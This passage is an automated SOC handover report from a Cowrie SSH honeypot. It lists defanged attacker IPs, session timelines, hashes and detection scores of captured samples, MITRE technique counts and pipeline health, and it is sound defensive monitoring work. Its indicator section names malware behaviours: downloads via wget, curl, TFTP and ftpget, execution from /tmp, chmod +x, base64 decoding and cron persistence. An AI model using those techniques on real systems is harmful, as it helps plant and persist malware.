| `2026-08-21 06:52:05` | `cowrie.session.connect` |
| `2026-08-21 06:52:05` | `cowrie.client.version` |
| `2026-08-21 06:52:05` | `cowrie.client.kex` |
| `2026-08-21 06:52:07` | `cowrie.login.success` |
| `2026-08-21 06:52:07` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-036c09cdf36c

| Field | Detail |
|---|---|
| **Source IP** | `125.69.76[.]148` |
| **First Seen** | 2026-08-21 06:52 |
| **Last Seen** | 2026-08-21 06:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:52:12` | `cowrie.session.connect` |
| `2026-08-21 06:52:13` | `cowrie.client.version` |
| `2026-08-21 06:52:13` | `cowrie.client.kex` |
| `2026-08-21 06:52:15` | `cowrie.login.success` |
| `2026-08-21 06:52:16` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.69.76[.]148` to AbuseIPDB if not already reported
- [ ] Block `125.69.76[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.140.80[.]162` | **30** | 2026-08-21 05:29 | 2026-08-21 05:30 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.75[.]72` | **10** | 2026-08-21 06:01 | 2026-08-21 06:01 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `80.251.153[.]178` | **9** | 2026-08-21 04:57 | 2026-08-21 06:49 | 8m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-21 05:16 | 2026-08-21 06:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `168.205.27[.]94` | **3** | 2026-08-21 06:28 | 2026-08-21 06:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **2** | 2026-08-21 04:59 | 2026-08-21 06:29 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `38.159.180[.]66` | **2** | 2026-08-21 05:26 | 2026-08-21 05:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-08-21 06:00 | 2026-08-21 06:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.155.51[.]175` | 1 | 2026-08-21 06:01 | 2026-08-21 06:01 | 6s | 0 | `T1592` | 🟢 LOW |
| `115.246.242[.]2` | 1 | 2026-08-21 05:05 | 2026-08-21 05:05 | 1s | 0 | `T1592` | 🟢 LOW |
| `117.85.191[.]19` | 1 | 2026-08-21 05:00 | 2026-08-21 05:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.73.162[.]224` | 1 | 2026-08-21 05:03 | 2026-08-21 05:03 | 8s | 0 | `T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-08-21 05:10 | 2026-08-21 05:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.182.204[.]219` | 1 | 2026-08-21 06:44 | 2026-08-21 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]30` | 1 | 2026-08-21 05:05 | 2026-08-21 05:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]149` | 1 | 2026-08-21 06:16 | 2026-08-21 06:17 | 39s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-21 05:40 | 2026-08-21 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.192.207[.]38` | 1 | 2026-08-21 05:47 | 2026-08-21 05:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `217.60.240[.]161` | 1 | 2026-08-21 05:29 | 2026-08-21 05:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.129.185[.]254` | 1 | 2026-08-21 05:37 | 2026-08-21 05:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-08-21 06:37 | 2026-08-21 06:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-08-21 05:40 | 2026-08-21 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.100.14[.]91` | 1 | 2026-08-21 05:03 | 2026-08-21 05:03 | 14s | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]25` | 1 | 2026-08-21 06:44 | 2026-08-21 06:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.142[.]132` | 1 | 2026-08-21 06:12 | 2026-08-21 06:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]114` | 1 | 2026-08-21 05:08 | 2026-08-21 05:08 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-08-21 05:48 | 2026-08-21 05:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]103` | 1 | 2026-08-21 05:08 | 2026-08-21 05:08 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]46` | 1 | 2026-08-21 06:34 | 2026-08-21 06:34 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `125.69.76[.]148` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `182.79.218[.]101` | IN | BHARTI-AIRTEL | **100** ⚠️ | 50 |
| `45.79.115[.]59` | US | Linode | **100** ⚠️ | 50 |
| `79.127.3[.]154` | IR | Asiatech Data Transmission Co. | **100** ⚠️ | 1 |
| `38.159.180[.]66` | AR | Cogent Communications, LLC | **100** ⚠️ | 0 |
| `213.234.9[.]218` | RU | OAO Bank Petrokommerc | **100** ⚠️ | 50 |
| `176.182.204[.]219` | FR | Bouygues Telecom SA | **100** ⚠️ | 1 |
| `49.124.142[.]132` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 131 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 112 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 24 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 22 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 21 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 215 cases |
| Tool 34  | Credential Extractor        | ✅ 133 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (9.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 16 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 112 priority case(s) shown individually · 29 recon entry/entries in table (7 group(s) consolidating 60 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-21T08:45:25Z_
